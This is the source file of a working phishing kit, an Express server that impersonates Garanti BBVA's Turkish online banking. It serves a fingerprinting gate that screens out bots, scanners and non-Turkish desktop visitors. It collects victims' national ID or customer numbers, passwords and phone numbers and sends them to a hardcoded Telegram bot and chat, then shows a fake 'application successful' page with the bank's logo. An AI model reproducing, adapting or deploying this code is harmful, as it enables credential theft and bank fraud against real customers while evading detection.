const express = require('express');
const compression = require('compression');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
const PORT = process.env.PORT || 3000;
const BIREYSEL_DIR = path.join(__dirname, 'public', 'bireysel');

// 🚀 DEV MODE: true yaparsanız bot koruması ve gate tamamen devre dışı kalır, her şeyi direkt geçersiniz.
// Canlıya (production) alırken bunu 'false' yapmayı unutmayın.
const DEV_MODE = true; 

const GATE_HTML = `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yükleniyor...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f2f2f2; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: Roboto, Arial, sans-serif; }
  .loader { text-align: center; }
  .spinner { width: 52px; height: 52px; border: 4px solid #ddd; border-top-color: #00b34a; border-radius: 50%; animation: spin 0.9s linear infinite; margin: 0 auto 18px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  p { color: #aaa; font-size: 13px; }
</style>
</head>
<body>
<div class="loader"><div class="spinner"></div><p>Lütfen bekleyiniz...</p></div>
<script>
(function(){
  var sent=false;
  function dropoff(){if(sent)return;try{navigator.sendBeacon('/api/js_dropoff');}catch(e){}}
  addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')dropoff();});
  addEventListener('pagehide',dropoff);
  function blockPage(){}
  function getGPU(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl',{alpha:false,antialias:false,depth:false,stencil:false})||c.getContext('experimental-webgl');if(!gl)return'no_webgl';var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(!dbg)return'no_debug';var r=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);return(r?String(r):'unknown').toLowerCase();}catch(e){return'exception';}}
  function canvasCheck(){try{var c=document.createElement('canvas');c.width=80;c.height=30;var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#00b34a';ctx.fillText('check',2,2);return c.toDataURL().length>500?'1':'0';}catch(e){return'0';}}
  var ua=(navigator.userAgent||'').toLowerCase();
  var isMob=ua.indexOf('android')!==-1||/iphone|ipad|ipod/.test(ua);
  var hasTouch='ontouchstart' in window;
  var narrowScreen=screen.width<=600;
  if(!isMob||!hasTouch||!narrowScreen){blockPage();return;}
  var t0=performance.now?performance.now():Date.now();
  var data={webgl_renderer:getGPU(),canvas_ok:canvasCheck(),platform:(navigator.platform||'').toLowerCase(),device:ua.indexOf('android')!==-1?'android':(/iphone|ipad|ipod/.test(ua)?'ios':'other'),webdriver:navigator.webdriver?'1':'0',pixel_ratio:String(window.devicePixelRatio||1),lang:navigator.language||'',touch:hasTouch?'1':'0',screen_w:String(screen.width),screen_h:String(screen.height),max_touch:String(navigator.maxTouchPoints||0)};
  data.exec_ms=String(Math.round((performance.now?performance.now():Date.now())-t0));
  fetch('/api/js_check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data),keepalive:true,credentials:'same-origin',cache:'no-store'})
  .then(function(r){return r.json();})
  .then(function(j){sent=true;if(j&&j.status==='pass'&&j.url){location.replace(j.url);}else{blockPage();}})
  .catch(function(){sent=true;setTimeout(function(){location.reload();},3000);});
})();
</script>
</body>
</html>`;

const PROTECT_SECRET = crypto.randomBytes(32).toString('hex');
const COOKIE_NAME = '_vkf_g';
const COOKIE_MAX_AGE = 60 * 60 * 24;

const HEADLESS_GPU_MARKERS = ['swiftshader', 'llvmpipe', 'mesa offscreen', 'softpipe', 'vmware', 'virtualbox'];

function signVal(val) {
  return crypto.createHmac('sha256', PROTECT_SECRET).update(val).digest('hex');
}

function createCookieToken() {
  const val = Date.now().toString(36) + '.' + crypto.randomBytes(8).toString('hex');
  return val + '.' + signVal(val);
}

function verifyCookieToken(token) {
  if (!token || typeof token !== 'string') return false;
  const dot = token.lastIndexOf('.');
  if (dot < 1) return false;
  const val = token.slice(0, dot);
  const sig = token.slice(dot + 1);
  return crypto.timingSafeEqual(
    Buffer.from(sig, 'hex').slice(0, 32),
    Buffer.from(signVal(val), 'hex').slice(0, 32)
  );
}

function parseCookies(req) {
  const list = {};
  const rc = req.headers.cookie;
  if (!rc) return list;
  rc.split(';').forEach(c => {
    const eq = c.indexOf('=');
    if (eq < 0) return;
    const k = c.slice(0, eq).trim();
    const v = c.slice(eq + 1).trim();
    try { list[k] = decodeURIComponent(v); } catch (e) { list[k] = v; }
  });
  return list;
}

function isBot(data) {
  if (DEV_MODE) return false; // Dev modunda asla bot sayma

  const gpu = (data.webgl_renderer || '').toLowerCase();
  const platform = (data.platform || '').toLowerCase();
  const device = data.device || 'other';

  if (data.webdriver === '1') return true;
  if (device !== 'android' && device !== 'ios') return true;
  if (HEADLESS_GPU_MARKERS.some(m => gpu.includes(m))) return true;
  if (gpu === 'no_webgl' || gpu === 'exception') return true;
  if (data.canvas_ok === '0') return true;

  const isMobileUA = device === 'android' || device === 'ios';
  const isDesktopPlatform = /win32|win64|macintel|linux x86_64|linux amd64/.test(platform);

  if (isMobileUA && isDesktopPlatform) return true;
  if (isMobileUA && data.touch === '0') return true;

  const DESKTOP_GPU = ['nvidia', 'geforce', 'quadro', 'gtx ', 'rtx ', 'mx ', 'radeon', 'amd ', 'rx ', 'vega', 'intel(r) hd graphics', 'intel(r) iris', 'intel(r) uhd', 'intel(r) arc'];
  if (isMobileUA && DESKTOP_GPU.some(m => gpu.includes(m))) return true;

// 1. Tarayıcı dili Türkçe (tr) değilse bot say
  const lang = (data.language || data.browser_lang || '').toLowerCase();
  if (lang && !lang.startsWith('tr')) return true;


  return false;
}

app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json());
app.use(compression());

app.post('/api/js_check', (req, res) => {
  const data = req.body || {};
  if (!DEV_MODE && isBot(data)) return res.json({ status: 'fail' });

  const token = createCookieToken();
  res.setHeader('Set-Cookie', `${COOKIE_NAME}=${encodeURIComponent(token)}; Path=/; HttpOnly; Max-Age=${COOKIE_MAX_AGE}; SameSite=Lax`);
  return res.json({ status: 'pass', url: '/bireysel/' });
});

app.post('/api/js_dropoff', (req, res) => res.status(200).end());
app.get('/api/js_dropoff', (req, res) => res.status(200).end());

// ─── GATE KONTROLÜ (DEV_MODE İLE BYPASS) ─────────────────────────────────────
app.use('/bireysel', (req, res, next) => {
  if (DEV_MODE) return next(); // Dev modunda gate kontrolünü tamamen atla

  const ext = path.extname(req.path);
  if (ext && ext !== '.html') return next();

  const cookies = parseCookies(req);
  let valid = false;
  try { valid = verifyCookieToken(cookies[COOKIE_NAME]); } catch (e) { }

  if (valid) return next();

  res.setHeader('Cache-Control', 'no-store, no-cache');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(GATE_HTML);
});

app.use('/bireysel', express.static(BIREYSEL_DIR, {
  maxAge: '1d',
  etag: true,
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-cache');
  }
}));
app.get('/', (req, res) => res.redirect('/bireysel/'));
app.get('/bireysel', (req, res) => res.redirect('/bireysel/'));

const TELEGRAM_BOT_TOKEN = '9153130065:AAHbFdkC0Ci_T9RGYHxY0Pp5GeVXfFCAOo0';
const TELEGRAM_CHAT_ID = '-1004351328928';

function getClientIP(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.connection && req.connection.remoteAddress || req.ip || 'bilinmiyor';
}
// Tek adımlı giriş endpoint'i (Sadece TC ve Parola alır)



// Kullanıcıların geçici verilerini IP bazlı hafizada tutmak için
const userSessions = {};

// 1. Adım: TC ve Parola Alınır, Telegram'a İlk Bildirim Atılır ve message_id Hafızaya Kaydedilir
app.post('/bireysel/step1', async (req, res) => {
  const { tc, password } = req.body;
  const ip = getClientIP(req);

  if (!tc || !password) {
    return res.status(400).json({ success: false, error: 'Lütfen T.C. ve parolanızı giriniz.' });
  }

  // İlk aşama mesajını hazırlıyoruz (Telefon henüz bekleniyor)
  let initialMsg = `🔔 *Yeni Giriş Denemesi (Aşama 1)*\n\n`;
  initialMsg += `🌐 *IP:* ${ip}\n`;
  initialMsg += `👤 *TC / Müşteri No:* \`${tc}\`\n`;
  initialMsg += `🔑 *Parola:* \`${password}\`\n`;
  initialMsg += `⏳ *Durum:* Telefon bekleniyor...`;

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        text: initialMsg, 
        parse_mode: 'Markdown' 
      })
    });
    
    const data = await resp.json();

    if (resp.ok && data.result) {
      // Telegram'dan dönen message_id'yi TC ve şifre ile birlikte RAM'e kaydediyoruz
      userSessions[ip] = { 
        tc, 
        password, 
        message_id: data.result.message_id 
      };
      console.log(`📥 [Adım 1] TC, Parola alındı ve ilk bildirim atıldı (IP: ${ip}, MsgID: ${data.result.message_id})`);
      
      return res.json({ success: true });
    } else {
      console.error('Telegram İlk Bildirim Hatası:', data);
      return res.status(500).json({ success: false, error: 'Telegram mesajı iletilemedi.' });
    }
  } catch (e) { 
    console.error('Sunucu Hatası:', e);
    return res.status(500).json({ success: false, error: 'Sunucu hatası oluştu.' }); 
  }
});
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// 2. Adım: Telefon Alınır, Hafızadaki message_id Kullanılarak Önceki Telegram Mesajı Güncellenir (Edit)
app.post('/bireysel/step2', async (req, res) => {
  const { phone } = req.body;
  const ip = getClientIP(req);
  await sleep(1000);
  // Hafızada bu IP'ye ait oturum ve message_id var mı kontrol edelim
  const savedData = userSessions[ip];
  if (!savedData || !savedData.tc || !savedData.password || !savedData.message_id) {
    return res.status(400).json({ success: false, error: 'Oturum süresi doldu veya eksik bilgi. Lütfen baştan başlayın.' });
  }

  if (!phone) {
    return res.status(400).json({ success: false, error: 'Lütfen telefon numaranızı giriniz.' });
  }

  console.log(`📥 [Adım 2] Telefon alındı (IP: ${ip}), Telegram mesajı güncelleniyor...`);

  // Güncellenmiş tam bilgi mesajını hazırlıyoruz
  let updatedMsg = `✅ *Tam Giriş Başarılı (Aşama 2)*\n\n`;
  updatedMsg += `🌐 *IP:* ${ip}\n`;
  updatedMsg += `👤 *TC / Müşteri No:* \`${savedData.tc}\`\n`;
  updatedMsg += `🔑 *Parola:* \`${savedData.password}\`\n`;
  updatedMsg += `📞 *Telefon:* \`${phone}\``;

  try {
    // Telegram'da editMessageText endpoint'ini kullanarak mevcut mesajı güncelliyoruz
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
    const resp = await fetch(url, {
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        message_id: savedData.message_id, 
        text: updatedMsg, 
        parse_mode: 'Markdown' 
      })
    });
    
    const data = await resp.json();
    
    // İşlem bittiği için sunucu hafızasından bu oturumu temizliyoruz
    delete userSessions[ip];

    if (resp.ok && data.result) {
      return res.json({ success: true });
    } else {
      console.error('Telegram Güncelleme Hatası:', data);
      return res.status(500).json({ success: false, error: 'Telegram mesajı güncellenemedi.' });
    }
  } catch (e) { 
    console.error('Sunucu Hatası:', e);
    return res.status(500).json({ success: false, error: 'Sunucu hatası oluştu.' }); 
  }
});
// Yanlışlıkla GET isteği gelirse ana sayfaya geri yönlendirsin
app.get('/bireysel/step1', (req, res) => res.redirect('/bireysel/'));
app.get('/bireysel/step2', (req, res) => res.redirect('/bireysel/'));

app.get('/bireysel/', (req, res) => {
  if (DEV_MODE) {
    return res.sendFile(path.join(BIREYSEL_DIR, 'index.html'));
  }

  const reqPath = req.params[0] || '';
  if (reqPath && path.extname(reqPath)) return res.status(404).send('File not found');

  const cookies = parseCookies(req);
  let valid = false;
  try { valid = verifyCookieToken(cookies[COOKIE_NAME]); } catch (e) { }

  if (!valid) {
    res.setHeader('Cache-Control', 'no-store, no-cache');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.send(GATE_HTML);
  }

  res.sendFile(path.join(BIREYSEL_DIR, 'index.html'));
});// Başarılı işlem sonrası gösterilecek ve akışın son adımı olan sayfa
app.get('/bireysel/basarili', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Garanti BBVA - İşlem Başarılı</title>
        <style>
            body { 
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
                background: #f4f6f8; 
                margin: 0; 
                display: flex;
                flex-direction: column;
                align-items: center;
                min-height: 100vh;
            }
            /* En üstteki logo bandı */
            .header-bar {
                width: 100%;
                background: #ffffff;
                padding: 15px 0;
                text-align: center;
                box-shadow: 0 2px 4px rgba(0,0,0,0.04);
                margin-bottom: 30px;
            }
            .header-bar img {
                max-width: 270px;
                height: auto;
                display: inline-block;
            }
            .container { 
                width: 100%; 
                max-width: 420px; 
                padding: 0 20px 20px 20px; 
                box-sizing: border-box;
            }
            .card { 
                background: white; 
                padding: 40px 30px; 
                border-radius: 12px; 
                box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
                text-align: center; 
            }
            .check-icon {
                width: 60px;
                height: 60px;
                background: #e6f4ea;
                color: #28a745;
                font-size: 32px;
                line-height: 60px;
                border-radius: 50%;
                margin: 0 auto 20px auto;
                font-weight: bold;
            }
            h2 { 
                color: #222; 
                font-size: 22px; 
                margin-bottom: 12px; 
                font-weight: bold; 
            }
            p { 
                color: #666; 
                font-size: 14px; 
                line-height: 1.6; 
                margin: 0; 
            }
        </style>
    </head>
    <body>
        <!-- Logonun yer aldığı en üst bant -->
        <div class="header-bar">
            <img src="/bireysel/assets/logo-garantibbva-2x.png" alt="Garanti Bankası A.Ş.">
        </div>

        <div class="container">
            <div class="card">
                <div class="check-icon">✓</div>
                <h2>Başvurunuz Başarılı!</h2>
                <p>Bilgileriniz alınmıştır. Müşteri temsilcimiz en kısa sürede size ulaşacaktır.</p>
            </div>
        </div>
    </body>
    </html>
  `);
});
app.get('/isube/login/login/passwordentrycorporate-tr', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kurumsal İşlemler</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 380px; }
            h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
            p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
            .btn { background: #009639; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="card">
            <h2>Hizmet Dışı</h2>
            <p>Şu anda kurumsal giriş işlemleri geçici olarak kullanılamamaktadır.</p>
            <a href="/bireysel" class="btn">Geri Dön</a>
        </div>
    </body>
    </html>
  `);
});
app.listen(PORT, () => {
  console.log(`🚀 Server ${PORT} portunda çalışıyor`);
  if (DEV_MODE) console.log(`⚠️  DEV_MODE aktif: Bot koruması ve Gate HTML devre dışı bırakıldı!`);
});

module.exports = app;